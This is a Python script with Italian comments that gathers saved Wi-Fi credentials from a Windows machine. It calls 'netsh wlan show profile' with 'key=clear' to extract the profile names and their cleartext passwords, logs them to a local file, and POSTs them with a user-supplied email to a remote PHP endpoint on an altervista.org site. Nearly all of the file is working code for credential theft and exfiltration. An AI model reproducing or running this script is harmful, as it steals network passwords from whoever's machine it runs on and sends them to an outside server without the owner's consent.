import os
import subprocess
import re
import requests

#recupera i nomi delle reti wifi

email = input("inserisci la mail a cui mandare i dati delle reti wf: ")

wifiNames = []

def removeAll(string, char):
    n = []
    i = 0
    string = re.split("", string)
    while i<len(string):
        if string[i] != char and string[i].isspace() == False:
            n.append(string[i])
        i = i+1
    string = "".join(n)
    return string
#print(x)
def removeSpaces(string) :
    n = []

    i = 0
    string = re.split("", string)
    while i<len(string):
        if string[i].isspace() == False:
            n.append(string[i])
            
        i = i+1
        
    string = "".join(n)
    print(string)
    print(len(string))

def rnw():


    s = subprocess.run(['netsh', 'wlan', 'show', 'profile'], capture_output=True, encoding="cp850", shell=True)
    output = s.stdout
    stringa = output #<class 'list'>
    #stringa = re.split(":", stringa)
    stringa = re.split("Tutti i profili utente", stringa)
    #print(len(stringa))

    i=1
    while i < len(stringa):
        #print(re.split(":", stringa[i]))
        #print(removeAll(stringa[i], ":"))
        wifiNames.append(removeAll(stringa[i], ":"))
        #print(stringa[i])
        i=i+1
        
    #print(wifiNames)

#recupera le pw delle reti wifi
wifiPass = []
def rpw():
    
    i=0
    f = open("output.txt", 'a')
    f.write("reti trovate:"+str(len(wifiNames)))
    while i<len(wifiNames):
        w = subprocess.run(['netsh', 'wlan', 'show', 'profile', wifiNames[i], 'key=clear'], capture_output=True, encoding="cp850", shell=True)
        #print(w.stdout)
        width = w.stdout
        width = re.split('\n', width)
        
        #print(width[20])
        #print(width[-3])
        #print(removeAll(width[-3], ":"))
        width[-3] = removeAll(width[-3], ":")
        #print(width[-3])
        width[-3] = re.split("Contenutochiave", width[-3])
        #print(width[-3])
        width[-3] = "".join(width[-3])
        #print(width[-3])
        wifiPass.append(width[-3])

        f.write(w.stdout)
        i= i+1


    f.close()
    #print(wifiPass)
wifidata = {}

    

rnw()
rpw()

url = "http://www.pastabianca.altervista.org/wifidata/index.php"

def uploadata():
    wn = ",".join(wifiNames)
    wp = ",".join(wifiPass)
    payload = {'wifiname': wn, 'pw': wp, 'email': email}
    r = requests.post(url, data=payload)
    print(r.text)
    

uploadata()
#print(wifiNames)
#print(wifiPass)
#print(wifidata)
#print(",".join(wifiNames))




